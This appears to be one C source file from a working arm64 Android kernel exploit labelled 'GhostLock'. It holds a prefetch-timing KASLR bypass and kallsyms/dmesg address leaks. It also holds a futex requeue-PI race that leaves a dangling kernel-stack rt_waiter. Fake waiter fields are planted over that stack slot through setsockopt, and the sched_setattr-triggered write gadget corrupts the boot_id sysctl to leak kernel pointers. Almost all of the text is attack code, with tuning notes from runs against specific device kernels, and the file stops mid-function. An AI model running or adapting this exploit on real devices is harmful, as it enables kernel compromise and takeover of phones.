#include "common.h"

#include <sys/socket.h>
#include <netinet/in.h>

#ifndef MCAST_JOIN_SOURCE_GROUP
#define MCAST_JOIN_SOURCE_GROUP 46
#endif

#define SLIDE_MAX_ATTEMPTS 20
#define SLIDE_CONSUME_DELAY 2000
#define SLIDE_CONSUME_USEC 0

/* ---------------- setsockopt-MCAST stamp overlay (z3q stack geometry) ----
 * The waiter (do_futex inlined rt_waiter) sits at SP0-0x190. The
 * IPPROTO_IP MCAST_JOIN_SOURCE_GROUP path copies a 264-byte
 * struct group_source_req to do_ip_setsockopt's frame at sp+0x20 with the
 * chain depth SP0-0x250 (sys_setsockopt 0x50 + springboard 0x10 +
 * sock_common_setsockopt 0x10 + springboard 0x10 + udp_setsockopt 0x10 +
 * ip_setsockopt 0x30 + do_ip_setsockopt 0x190), so the gsr lands at
 * SP0-0x230 and the waiter's fields are gsr+0xa0..0xe8 — ALL inside the
 * fully-controlled copy (the family/port validation happens AFTER the
 * copy and its EINVAL return is irrelevant to the stamp).
 *
 * All frame sizes and both copy sites are disasm-verified against the
 * shipped vmlinux (out/vmlinux): __arm64_sys_futex 0x70 + do_futex 0x1e0
 * with the inlined rt_waiter at sp+0xc0 ("add x28, sp, #0xc0"); the gsr
 * copy is "add x0, sp, #0x20; mov w2, #0x108; bl __arch_copy_from_user"
 * in do_ip_setsockopt. waiter - gsr = (SP0-0x190) - (SP0-0x230) = 0xa0
 * (the old 0x40 table planted 0x60 above the waiter and never stamped
 * it).
 *
 * The pselect overlay cannot work on this build: its fd_set buffers span
 * [SP0-0x210, SP0-0x138) but only the first 15 qwords are user-controlled,
 * ending 8 bytes ABOVE the waiter's tree_entry. */
#define STAMP_GSR_WAITER_OFF 0xa0
#define STAMP_BUF_SZ 264
#define STAMP_ROUNDS 200000

static int slide_stamp_fd = -1;
static char slide_stamp_buf[STAMP_BUF_SZ];

static uint32_t slide_f_wait;
static uint32_t slide_f_pi_target;
static uint32_t slide_f_pi_chain;
static atomic_int slide_waiter_ready;
static atomic_int slide_waiter_waiting;
static atomic_int slide_owner_started;
static atomic_int slide_route_done;
static atomic_int slide_waiter_tid;
static atomic_int slide_consume_calls;
static atomic_int slide_consume_go;
static atomic_int slide_consume_seen;
static atomic_int slide_consume_lost;
static atomic_int slide_consume_enter_sched;
static atomic_int slide_consume_stop;
static atomic_int slide_consume_sched_ok;
static atomic_int slide_consume_last_sched_ret;
static atomic_int slide_consume_last_sched_errno;
/* per-fire slide hypothesis delta in 2MB units (set by the consumer
 * before each sched_setattr; the stamp loop re-plants with it). The
 * oracle's answer proved to place the mirror on a zeroed .bss page (the
 * walk's trylock succeeds every time) but W1 never lands in the boot_id
 * slot — the mirror-in-.bss geometry pins the true slide to
 * {guess-2MB, guess, guess+2MB}, so the fires sweep those three. */
static atomic_int slide_fire_k;
/* while set, the stamp loop stops issuing setsockopt and spins in
 * userspace: the planted waiter fields are RESIDENT (the waiter thread
 * is parked in pause() whose frames stay above the region), so the
 * walk triggered by the consumer's sched_setattr reads one consistent
 * planted set instead of racing the 264-byte copy (runs 19-27: ~1/3 of
 * fires panicked from mid-copy torn reads — those panics carry no
 * information about the slide hypothesis under test). */
static atomic_int slide_stamp_hold;
static char slide_stock_bootid[64];
static int slide_stock_bootid_len;
static uint64_t slide_slide;   /* per-boot KASLR slide (prefetch oracle) */


/* ---------------- per-boot KASLR slide oracle (EL0 prefetch TLB timing) ----
 * No KPTI on this SoC, so kernel mappings live in every user process's TTBR1
 * tables. A burst of PRFM on one VA times ~5 when the page is TLB-resident
 * vs 14-22 when every PRFM walks and fails. Cold-mapped pages are invisible
 * (Cortex-A77 does not fill the TLB for permission-failing EL0 prefetches),
 * but the image's first 2MB holds the exception vectors (+0x2000), which
 * are hot on every timer interrupt. The image base is 2MB-aligned and lives
 * inside the vmalloc region, so sweeping that region at 2MB steps finds
 * exactly one candidate cluster; its first slot is the image base.
 * Zero crash risk: PRFM is a non-faulting hint. (tools/prefetch_probe.c is
 * the standalone twin of this code.) */
/* Single-shot first-touch timing: ONE 64-PRFM burst, no retries. A
 * retry loop self-installs the TLB entry on the first burst (speculative
 * walk) and then measures its own install as "hot" — best-of-N timing
 * degenerates into a *mapped-ness* oracle, and the vmalloc region below
 * the image is heavily mapped, so the "lowest hot trio" rule returned a
 * vmalloc window instead of the image base. First-touch timing cannot
 * false-ACCEPT (a walk costs >= 14 ticks); it can only false-reject
 * (interrupt hiccup), which the outer per-core/per-round retries absorb.
 * The three anchor grids (+0x2000 / +0x1980000 / +0x2c07000 at 2MB
 * steps) are mutually disjoint (their pairwise deltas are not 2MB
 * multiples), so a single scan touches each page exactly once and never
 * warms another hypothesis's anchor. */
static uint64_t slide_prefetch_first(uint64_t va)
{
    uint64_t t0, t1;
    asm volatile("isb\nmrs %0, cntvct_el0" : "=r"(t0));
    for (int i = 0; i < 64; i++)
        asm volatile("prfm pldl1keep, [%0]" :: "r"(va) : "memory");
    asm volatile("isb\nmrs %0, cntvct_el0" : "=r"(t1));
    return t1 - t0;
}

/* Tolerant pin: hotplug-offline big cores fail with EINVAL — skip them
 * instead of dying (SYSCHK-pin would exit the whole process). */
static int slide_try_pin_core(size_t core)
{
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core, &cpuset);
    return sched_setaffinity(0, sizeof(cpuset), &cpuset) == 0;
}

/* Burn cycles for a couple of seconds so the scheduler hotplugs the big
 * cluster online (the A55 cluster's TLB never serves EL0 prefetches from
 * kernel image entries; the A77 cluster does). */
static void *slide_hotplug_spinner(void *arg __attribute__((unused)))
{
    struct timespec deadline;
    SYSCHK(clock_gettime(CLOCK_MONOTONIC, &deadline));
    deadline.tv_sec += 3;
    for (;;) {
        struct timespec now;
        SYSCHK(clock_gettime(CLOCK_MONOTONIC, &now));
        if (now.tv_sec > deadline.tv_sec ||
            (now.tv_sec == deadline.tv_sec && now.tv_nsec >= deadline.tv_nsec)) {
            return NULL;
        }
        for (int i = 0; i < 100000; i++) {
            __asm__ volatile("nop");
        }
    }
}

static void slide_wake_big_clusters(void)
{
    pthread_t th[8];
    int n = (int)(sizeof(th) / sizeof(th[0]));
    for (int i = 0; i < n; i++) {
        if (pthread_create(&th[i], NULL, slide_hotplug_spinner, NULL) != 0) {
            n = i;
            break;
        }
    }
    for (int i = 0; i < n; i++) {
        pthread_join(th[i], NULL);
    }
}

/* Grid-A scan on the CURRENT core. Returns the image base VA or ~0.
 *
 * The anchor is the exception-vectors page: every interrupt AND every
 * syscall i-fetches the vectors at image_base+0x2000, so on a core that
 * executes anything, that page is TLB-resident. The scan does its own
 * syscalls (getpid) before and during the sweep to keep the vectors page
 * AND the sys_call_table page (image_base+0x1980000, read by every
 * syscall) AND the jiffies page (image_base+0x2c07000 — the TRUE jiffies
 * link VA is 0xffffff800ac07180; the old 0x2b87000 anchor probed a page
 * 0x80180 away whose hotness tracked system activity, not the tick —
 * the oracle "succeeded" on busy boots and went blind on idle ones
 * without ever validating jiffies). A pinned, running core takes its
 * tick, so the true jiffies page is always TLB-hot on the probing core.
 * syscall) hot on the probing core — an idle phone suspend-cycles and
 * flushes the TLB, so a silent sweep measures nothing (run 13).
 *
 * The rule: the LOWEST 2MB slot whose +0x2000, +0x1980000 and +0x2c07000
 * pages all pass a FIRST-TOUCH timing (< 10 ticks, no retry — see
 * slide_prefetch_first) is the image base: only the TRUE hypothesis's
 * trio is naturally TLB-hot on a syscall-issuing, tick-taking core
 * (vectors + sys_call_table warmed by our own getpid, jiffies by the
 * local tick); everything else is cold before its first probe and a
 * walk costs >= 14 ticks. The three anchor grids are mutually disjoint,
 * so the scan touches each page exactly once and cannot warm another
 * hypothesis's anchor. */
static uint64_t slide_scan_image_base(void)
{
    const uint64_t link = KIMAGE_TEXT_BASE;
    /* absolute VA cap: keep an image-size margin below the linear map
     * base (compare against va itself, which is an absolute VA — the
     * earlier PO-link-0x4200000 form computed a LENGTH and the loop
     * folded to dead code, every scan "saw nothing") */
    const uint64_t limit = 0xffffffc000000000ULL - 0x4200000ULL;
    for (int i = 0; i < 32; i++) {
        (void)getpid();
    }
    uint64_t probed = 0;
    for (uint64_t va = link; va < limit; va += 0x200000ULL) {
        if ((++probed & 0x3f) == 0) {
            (void)getpid();
        }
        uint64_t tv = slide_prefetch_first(va + 0x2000ULL);
        if (tv < 10) {
            uint64_t ts = slide_prefetch_first(va + 0x1980000ULL);
            uint64_t tj = slide_prefetch_first(va + 0x2c07000ULL);
            if (ts < 10 && tj < 10) {
                pr_info("slide oracle trio va=%016llx t_vec=%llu t_sct=%llu "
                        "t_jif=%llu\n",
                        (unsigned long long)va,
                        (unsigned long long)tv, (unsigned long long)ts,
                        (unsigned long long)tj);
                return va;
            }
        }
    }
    return ~0ULL;
}

static uint64_t slide_oracle_find_slide(void)
{
    /* Grid-A image-base rule (run-11..13 lessons): probe the +0x2000 page
     * of every 2MB slot (link + s*2MB + 0x2000) — the exception-vectors
     * page of each slide hypothesis. The vectors page is i-fetched on
     * every interrupt and every syscall, so the TRUE hypothesis's page is
     * TLB-resident on any active core; the scan keeps it (and the
     * sys_call_table / jiffies anchor pages) warm with its own getpid()
     * traffic. Grid-A VAs below the image land in the empty vmalloc gap
     * and read cold, so the LOWEST hot slot IS the image base. The old
     * grid-B rule (sys_call_table + jiffies pages, lowest dual-confirmed)
     * mis-fired twice: on run-11's boot a coincidental in-image pair at
     * s=0 beat the true slide 0x200000, and every planted VA being 2MB
     * off made the erase walk fault at its first deref of the "mirror";
     * and a silent full-span sweep on an idle (suspend-cycling) system
     * measures everything cold.
     *
     * TLB visibility is also per-cluster and hotplug-dependent: on this
     * device the A55 cluster serves EL0 prefetches from kernel entries
     * while an idle A77 often does not, and the big cores hotplug-off at
     * idle — so skip unpinnable cores, and if no online core sees the
     * anchors, spin for a few seconds to force the big cluster online
     * and retry. */
    int ncpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
    if (ncpu < 1) {
        ncpu = 1;
    }
    for (int round = 0; round < 4; round++) {
        if (round > 0) {
            pr_info("slide oracle: waking the big cluster (round %d)\n",
                    round);
            slide_wake_big_clusters();
        }
        for (int core = 0; core < ncpu; core++) {
            if (!slide_try_pin_core((size_t)core)) {
                pr_info("slide oracle: core %d offline\n", core);
                continue;
            }
            uint64_t base = slide_scan_image_base();
            if (base == ~0ULL) {
                pr_info("slide oracle: core %d sees no image cluster\n", core);
                continue;
            }
            uint64_t slide = base - KIMAGE_TEXT_BASE;
            pr_success("slide oracle: slide=%016llx base=%016llx core=%d\n",
                       (unsigned long long)slide, (unsigned long long)base,
                       core);
            pin_to_core(CORE);
            return slide;
        }
    }
    pin_to_core(CORE);
    pr_warning("slide oracle: no core saw a 3-hot image base cluster\n");
    return ~0ULL;
}

static void slide_capture_stock_bootid(void) {
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    slide_stock_bootid_len = -1;
    return;
  }
  ssize_t n = read(fd, slide_stock_bootid, sizeof(slide_stock_bootid) - 1);
  close(fd);
  if (n <= 0) {
    slide_stock_bootid_len = -1;
    return;
  }
  slide_stock_bootid[n] = 0;
  while (n > 0 && slide_stock_bootid[n - 1] == '\n') {
    slide_stock_bootid[--n] = 0;
  }
  slide_stock_bootid_len = (int)n;
  pr_info("slide stock boot_id captured len=%zd\n", n);
}

/* Rebuild the planted waiter fields for one slide hypothesis. k is in
 * 2MB units relative to the oracle's slide. Only the W1/W2 targets
 * (C = boot_id slot, P = loggers) ride the sweep: the mirror is pinned
 * to the oracle's slide because ANY zeroed .bss page works as the fake
 * rt_mutex (0xc2f0000 verified zeroed every boot), while a swept mirror
 * walks off the image tail and trylocks unmapped/module memory (run 25:
 * k=4's mirror faulted before the erase). */
static void slide_stamp_build(int k) {
  uint64_t sweep = slide_slide + (uint64_t)(int64_t)k * 0x200000ULL;
  /* P = the leak pair the boot_id readback will serve (see
   * SLIDE_READ_PAIR_OFF in target.h): the qword pair below the
   * boot_id entry's .data slot — q1 = the "boot_id" procname pointer
   * (link 0xffffff800a209a37 + slide), so the readback leaks the
   * slide directly. Other P candidates fail: &loggers[0][0] has a
   * zero byte 8 at runtime (proc_do_uuid regenerates instead of
   * serving, run 36), linux_banner is .rodata (W2's *(P+8)=C write
   * faults read-only, run 37), and the boot_id entry's own
   * proc_handler slot must never be P (W2 would corrupt it and the
   * next sysctl read would call a data address as a function). */
  uint64_t leak_p = SLIDE_READ_PAIR_IMAGE + sweep;
  uint64_t bootid_data = SLIDE_RANDOM_BOOT_ID_DATA_IMAGE + sweep;
  uint64_t mirror = SLIDE_MIRROR_LOCK_IMAGE + slide_slide;
  /* waiter->task: the [9]-exit wake_up_process(W->task) — a zeroed
   * .bss VA is the only choice safe for EVERY slide hypothesis (a
   * garbage .data "task" hangs ttwu on its pi_lock, run 28; the real
   * init_task works only at the true slide). On a zeroed page
   * state==TASK_RUNNING so ttwu returns immediately. */
  uint64_t fake_task = mirror + 8;

  /* waiter field F lives at gsr + (STAMP_GSR_WAITER_OFF + F) */
  uint64_t *q = (uint64_t *)(slide_stamp_buf + STAMP_GSR_WAITER_OFF);
  q[0] = leak_p;              /* tree_entry.rb_parent_color = P (W1 value) */
  q[1] = 0;                   /* tree_entry.rb_right = NULL (simple path) */
  q[2] = bootid_data;         /* tree_entry.rb_left = C (W1 target) */
  q[3] = leak_p;              /* pi_tree_entry.rb_parent_color */
  q[4] = 0;                   /* pi_tree_entry.rb_right */
  q[5] = bootid_data;         /* pi_tree_entry.rb_left */
  q[6] = fake_task;           /* waiter->task: zeroed page, wake-safe */
  q[7] = mirror;              /* waiter->lock (all-zero rt_mutex, walkable) */
  q[8] = 130;                 /* waiter->prio: never equals a nice-class
                                 task prio (120..129) so every fire walks */
  q[9] = 0;                   /* waiter->deadline */
}

static void slide_stamp_prepare(void) {
  memset(slide_stamp_buf, 0, sizeof(slide_stamp_buf));
  slide_stamp_build(0);
  pr_info("slide stamp: leak_p=%016llx bootid_data=%016llx task=%016llx "
          "lock=%016llx\n",
          (unsigned long long)(SLIDE_READ_PAIR_IMAGE + slide_slide),
          (unsigned long long)(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE + slide_slide),
          (unsigned long long)(SLIDE_INIT_TASK_IMAGE + slide_slide),
          (unsigned long long)(SLIDE_MIRROR_LOCK_IMAGE + slide_slide));

  slide_stamp_fd = socket(AF_INET, SOCK_DGRAM, 0);
  if (slide_stamp_fd < 0) {
    pr_error("slide stamp socket failed errno=%d\n", errno);
  }
}

static void slide_stamp_once(void) {
  if (slide_stamp_fd < 0) {
    return;
  }
  slide_stamp_build(atomic_load(&slide_fire_k));
  setsockopt(slide_stamp_fd, IPPROTO_IP, MCAST_JOIN_SOURCE_GROUP,
             slide_stamp_buf, STAMP_BUF_SZ);
}

/* spin without syscalls: the last planted copy stays resident on the
 * waiter's kernel stack until the next setsockopt overwrites it */
static void slide_stamp_halt(void) {
  while (atomic_load(&slide_stamp_hold)) {
    __asm__ volatile("yield" ::: "memory");
  }
}

void *slide_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;
  for (;;) {
    int seq = atomic_load(&slide_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      if (atomic_load(&slide_consume_stop)) {
        return NULL;
      }
      continue;
    }

    seen = seq;
    atomic_store(&slide_consume_seen, seen);
    if (SLIDE_CONSUME_USEC) {
      usleep(SLIDE_CONSUME_USEC);
    } else {
      for (int spin = 0; spin < SLIDE_CONSUME_DELAY; spin++) {
        __asm__ volatile("yield" ::: "memory");
      }
    }
    if (atomic_load(&slide_consume_go) != seq) {
      int lost = atomic_load(&slide_consume_lost) + 1;
      atomic_store(&slide_consume_lost, lost);
      continue;
    }

    if (seq == 1) {
      usleep(PSELECT_ENTER_DELAY_USEC);
    }

    int tid = atomic_load(&slide_waiter_tid);
    /* ONE fire per boot: the walk's pi-tree erase uses the planted
     * links, and its re-enqueue then re-links the waiter into the REAL
     * task's pi_waiters tree with those fake links — the tree is left
     * corrupted, so every fire after the first walks on garbage (runs
     * 19-27's fire-2+ results are void). One virgin fire per boot, one
     * slide hypothesis per boot; k comes from GHOSTLOCK_K so the sweep
     * iterates without rebuilds. Post-fire order matters: the gadget
     * writes can corrupt a live .data structure that kills THIS process
     * on its next syscall (runs 34-35: the child died between the fire
     * and the "ret=" log line, losing the readback) — so pre-open the
     * boot_id fd, fire, read back FIRST (one read(2), no open, no
     * logging), and only then write the log lines. */
    int k = 0;
    const char *kenv = getenv("GHOSTLOCK_K");
    if (kenv) {
      k = atoi(kenv);
    }
    int bootid_fd = open("/proc/sys/kernel/random/boot_id",
                         O_RDONLY | O_CLOEXEC);
    for (int f = 0; f < 1; f++) {
      if (!atomic_load(&slide_consume_go)) {
        break;
      }
      atomic_store(&slide_fire_k, k);
      /* let the stamper re-plant with this fire's hypothesis, then
       * freeze the copy so the walk reads one consistent field set */
      usleep(10000);
      atomic_store(&slide_stamp_hold, 1);
      usleep(2000);
      int calls = atomic_load(&slide_consume_calls);
      atomic_store(&slide_consume_calls, calls + 1);
      errno = 0;
      pr_info("slide consumer sched_setattr pre tid=%d nice=0 k=%d\n",
              tid, k);
      long ret = sched_setattr_tid(tid, 0);
      int saved_errno = errno;
      /* readback BEFORE any other syscall or log write: after a
       * successful W1 the slot stays leaked for the whole boot, so a
       * raw compare against the stock UUID is enough here; the full
       * stext derivation (slide_read_stext) can run later from any
       * process if we survive. */
      uint64_t stext = 0;
      {
        char buf[64];
        ssize_t n = -1;
        if (bootid_fd >= 0) {
          errno = 0;
          n = read(bootid_fd, buf, sizeof(buf) - 1);
        }
        if (n > 0) {
          buf[n] = 0;
          if (slide_stock_bootid_len > 0 &&
              strncmp(buf, slide_stock_bootid,
                      (size_t)slide_stock_bootid_len) == 0) {
            /* unchanged */
          } else {
            stext = 1;
            pr_success("slide CHILD CONFIRMED write landed k=%d boot_id="
                       "%s\n",
                       k, buf);
          }
        }
      }
      pr_info("slide consumer sched_setattr ret=%ld errno=%d\n",
              ret, saved_errno);
      atomic_store(&slide_consume_last_sched_ret, (int)ret);
      atomic_store(&slide_consume_last_sched_errno, saved_errno);
      if (ret == 0) {
        int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
        atomic_store(&slide_consume_sched_ok, sched_ok);
      }
      atomic_store(&slide_stamp_hold, 0);
      if (stext) {
        break;
      }
      usleep(20000);
    }
    if (bootid_fd >= 0) {
      close(bootid_fd);
    }
    atomic_store(&slide_consume_stop, 1);
    while (atomic_load(&slide_consume_go)) {
      __asm__ volatile("yield" ::: "memory");
    }
    return NULL;
  }
}

void *slide_waiter_thread(void *arg __attribute__((unused))) {
  int tid = (int)SYSCHK(syscall(SYS_gettid));
  atomic_store(&slide_waiter_tid, tid);

  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&slide_waiter_ready, 1);
  while (!atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  /* upstream GhostLock poc timing: 50ms futex timeout, the requeue lands
   * ~20ms in — the timeout cleanup races the requeue finalization and
   * leaves the rt_waiter dangling on this thread's stack. */
  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_nsec += 50000000;
  if (timeout.tv_nsec >= 1000000000) {
    timeout.tv_sec++;
    timeout.tv_nsec -= 1000000000;
  }

  atomic_store(&slide_waiter_waiting, 1);
  errno = 0;
  long wret = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                       &slide_f_pi_target, 0);
  /* -ETIMEDOUT via handle_early_requeue_pi_wakeup's early path leaves
   * pi_blocked_on dangling if the requeue already enqueued+failed us;
   * -EWOULDBLOCK/-EAGAIN means we returned before the requeue ran (no
   * dangle). */
  pr_info("slide waiter futex returned ret=%ld errno=%d\n", wret, errno);
  /* Do NOT unlock f_pi_chain here: the pi chain (owner blocked on it) is
   * what makes the requeue race leave this thread's rt_waiter dangling;
   * the waiter task keeps holding f_pi_chain so the owner stays blocked
   * and the kernel's view of this task as a pi-chain member persists. */

  /* Erase consumer (Q1, derived from the shipped kernel source): the
   * requeue path's rt_mutex_start_proxy_lock gets -EDEADLK from the
   * chain walk (owner holds f_pi_target and is blocked on f_pi_chain,
   * which the waiter holds — a pi cycle) and calls remove_waiter(), but
   * remove_waiter() clears *current*'s pi_blocked_on — current is the
   * requeue caller, NOT the waiter task. The waiter task's own timeout
   * path (handle_early_requeue_pi_wakeup) never touches pi_blocked_on.
   * So the task returns to userspace with pi_blocked_on still pointing
   * at the stack rt_waiter: the dangling state.
   *
   * The consumer fires one sched_setattr on the waiter TID: the nice
   * change reaches rt_mutex_adjust_pi(waiter) -> rt_mutex_adjust_prio_
   * chain step [7] rt_mutex_dequeue(lock = waiter->lock = the planted
   * all-zero mirror), which runs rb_erase_cached on the stamped
   * tree_entry — the W1/W2 gadget pair. The walk then re-enqueues the
   * waiter into the mirror's tree and exits at step [9] (the mirror has
   * no owner) after wake_up_process(waiter->task = init_task, a
   * benign no-op on the always-running idle task). Planting the mirror
   * as waiter->lock is what avoids step [11]'s
   * rt_mutex_dequeue_pi(owner, prerequeue_top_waiter=NULL) NULL-deref:
   * with any lock that HAS an owner (e.g. the stale real target lock
   * the un-stamped waiter keeps), step [11] dereferences address 0x18
   * and panics — the run-#10 crash signature, not an exit-overwrite
   * race. */
  slide_stamp_prepare();
  /* plant the waiter fields BEFORE releasing the consumer: rt_mutex_
   * adjust_pi reads waiter->lock up front and the walk re-reads it at
   * step [3]; if the first stamp had not landed yet, the walk would
   * compare a stale real lock against the planted mirror and silently
   * exit — the run-14 attempt-1 no-write signature. */
  for (int i = 0; i < 64; i++) {
    slide_stamp_once();
  }
  pr_info("slide stamp loop start rounds=%d\n", STAMP_ROUNDS);
  atomic_store(&slide_consume_go, 1);
  /* NO logging inside the loop: every pr_info is a write+fsync syscall
   * whose driver frames plow through the stamped region [SP0-0x230,
   * SP0-0x128) and leave garbage there until the next setsockopt
   * re-plants it (run 15/16: the consumer's walk fired during a log
   * window and consumed trashed fields). Between two stamps the region
   * now holds ONLY the planted values. */
  for (int i = 0; i < STAMP_ROUNDS; i++) {
    if (atomic_load(&slide_stamp_hold)) {
      slide_stamp_halt();
      continue;
    }
    slide_stamp_once();
  }
  pr_info("slide stamp loop done\n");
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_route_done, 1);
  /* Park syscall-free so the stamped kernel stack frame survives until
   * the requeue-race cleanup erases it during the stamp window (the
   * k40-exploit design: the waiter stays parked inside/near the overlay
   * and the erase fires from the requeue path, NOT from process-exit
   * teardown — do_exit's deep frames overwrite the stamped region, which
   * is the _exit flow the upstream *poc* uses for its crash demo only).
   * pause() itself only enters frames above SP0-0x60, so the stamped
   * region [SP0-0x230, SP0-0x128) survives the park. */
  pr_info("slide waiter parking (stamp survives)\n");
  for (;;) {
    pause();
  }
}

void *slide_owner_thread(void *arg __attribute__((unused))) {
  if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide owner lock target errno=%d\n", errno);
    return NULL;
  }

  while (!atomic_load(&slide_waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&slide_owner_started, 1);
  futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);

  for (;;) {
    sleep(1);
  }
}

int hex_value(char c) {
  if (c >= '0' && c <= '9') {
    return c - '0';
  }
  if (c >= 'a' && c <= 'f') {
    return c - 'a' + 10;
  }
  if (c >= 'A' && c <= 'F') {
    return c - 'A' + 10;
  }
  return -1;
}

uint64_t slide_read_stext(void) {
  char buf[64];
  unsigned char raw[16];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide boot_id read denied errno=%d\n", errno);
    return 0;
  }

  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n < 0) {
    pr_warning("slide boot_id read failed errno=%d\n", saved_errno);
    return 0;
  }
  buf[n] = 0;

  int nibble = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int v = hex_value(buf[i]);
    if (v < 0) {
      continue;
    }
    if (nibble < 0) {
      nibble = v;
      continue;
    }
    raw[out++] = (unsigned char)((nibble << 4) | v);
    nibble = -1;
  }
  if (out != 16) {
    pr_warning("slide short boot_id parse out=%d n=%zd\n", out, n);
    return 0;
  }

  uint64_t leaked = 0;
  for (int i = 0; i < 8; i++) {
    leaked |= (uint64_t)raw[i] << (i * 8);
  }
  uint64_t leaked_hi = 0;
  for (int i = 8; i < 16; i++) {
    leaked_hi |= (uint64_t)raw[i] << ((i - 8) * 8);
  }
  pr_success("slide boot_id readback pid=%d q0=%016llx q1=%016llx\n",
             getpid(), (unsigned long long)leaked,
             (unsigned long long)leaked_hi);
  /* The readback serves the READ_PAIR (see slide_stamp_build): q0 =
   * the qword at random_table[3]'s tail field, q1 = the "boot_id"
   * entry's procname pointer = link 0xffffff800a209a37 + slide. The
   * derived slide both leaks the KASLR slide directly and
   * cross-validates the prefetch oracle. */
  if (slide_stock_bootid_len > 0 &&
      strncmp(buf, slide_stock_bootid, (size_t)slide_stock_bootid_len) == 0) {
    pr_warning("slide boot_id unchanged — write did not land\n");
    return 0;
  }
  if ((leaked_hi >> 48) == 0xffff) {
    uint64_t slide = leaked_hi - SLIDE_BOOTID_STRING_IMAGE;
    uint64_t stext = KIMAGE_TEXT_BASE + slide;
    if ((slide & 0x1fffffULL) != 0) {
      pr_warning("slide readback q1=%016llx not 2MB-aligned — suspect "
                 "non-leak content\n",
                 (unsigned long long)leaked_hi);
      return 0;
    }
    pr_success("slide boot_id LEAK q0=%016llx q1=%016llx slide=%016llx "
               "stext=%016llx\n",
               (unsigned long long)leaked, (unsigned long long)leaked_hi,
               (unsigned long long)slide, (unsigned long long)stext);
    return stext;
  }
  pr_warning("slide readback changed but q1=%016llx is not a kernel "
             "pointer — non-leak content\n",
             (unsigned long long)leaked_hi);
  return 0;
}
/* Runs the requeue race in the CHILD process; the waiter thread stamps
 * the dangling rt_waiter, parks syscall-free, and the consumer's
 * sched_setattr triggers the PI-adjust walk that erases the stamped
 * waiter (the W1/W2 gadget pair). The boot_id readback happens in the
 * parent after the 15s park window. */
void slide_child_leak_stext(void) {
  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));

  while (!atomic_load(&slide_waiter_waiting) ||
         !atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  usleep(20000);
  errno = 0;
  long rq_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                         &slide_f_pi_target, 0);
  /* -EDEADLK = the requeue's start_proxy_lock hit the pi cycle and
   * remove_waiter() cleared the wrong task's pi_blocked_on = the dangle
   * formed; -EAGAIN/-EINVAL = the waiter's timeout won the race and
   * nothing dangles; 0/1 = requeue succeeded (no cycle seen). */
  pr_info("slide child requeue ret=%ld errno=%d\n", rq_ret, errno);

  /* Park until the waiter's stamp loop _exit()s the process (fallback
   * timeout so a failed race does not hang the attempt forever). */
  sleep(15);
}

/* round-3: direct KASLR leak via /proc/kallsyms (safe; works when addresses
 * are not restricted - common on OPPO/ColorOS debug builds) */
static int slide_leak_from_kallsyms(void) {
  FILE *f = fopen("/proc/kallsyms", "r");
  if (!f) {
    return 0;
  }
  char line[256];
  uint64_t text = 0;
  while (fgets(line, sizeof(line), f)) {
    unsigned long long addr = 0;
    char type = 0;
    char name[128] = {0};
    if (sscanf(line, "%llx %c %127s", &addr, &type, name) == 3 &&
        strcmp(name, "_text") == 0) {
      text = (uint64_t)addr;
      break;
    }
  }
  fclose(f);
  if (text >= 0xffffff8000000000ULL && (text & 0xffff) == 0) {
    kaslr_base = text;
    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
    kaslr_done = 1;
    pr_success("slide-kallsyms-ok pid=%d base=%016llx slide=%016llx\n",
               getpid(), (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide);
    return 1;
  }
  pr_warning("slide: /proc/kallsyms restricted or _text unusable\n");
  return 0;
}

/* round-3: dmesg "Kernel Offset" fallback */
static int slide_leak_from_dmesg(void) {
  FILE *f = popen("dmesg 2>/dev/null | grep 'Kernel Offset'", "r");
  if (!f) {
    return 0;
  }
  char line[256];
  int got = 0;
  unsigned long long off = 0;
  while (fgets(line, sizeof(line), f)) {
    if (sscanf(line, "%*[^:]Kernel Offset: 0x%llx", &off) == 1) {
      got = 1;
      break;
    }
  }
  pclose(f);
  if (!got) {
    pr_warning("slide: dmesg Kernel Offset unavailable\n");
    return 0;
  }
  kaslr_base = KIMAGE_TEXT_BASE + off;
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  pr_success("slide-dmesg-ok pid=%d off=%016llx base=%016llx\n",
             getpid(), off, (unsigned long long)kaslr_base);
  return 1;
}

int slide_leak_kernel_base(void) {
  if (slide_leak_from_kallsyms() || slide_leak_from_dmesg()) {
    return 1;
  }
  slide_slide = slide_oracle_find_slide();
  if (slide_slide == ~0ULL) {
    /* No verified slide: every planted VA would be garbage and the first
     * erase walk would panic. Fail the stage cleanly instead. */
    pr_error("slide: oracle failed, refusing to run the race blind\n");
    return 0;
